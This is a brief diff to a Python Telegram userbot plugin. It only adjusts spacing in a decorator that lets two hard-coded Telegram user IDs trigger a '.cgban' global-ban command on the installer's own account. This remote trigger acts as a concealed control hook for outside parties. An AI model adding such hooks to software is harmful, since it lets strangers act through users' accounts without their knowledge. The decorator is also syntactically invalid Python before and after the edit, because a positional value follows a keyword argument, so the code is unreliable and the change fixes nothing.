@@ -79,7 +79,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=1683788007, 2059940927, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=1683788007,2059940927, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
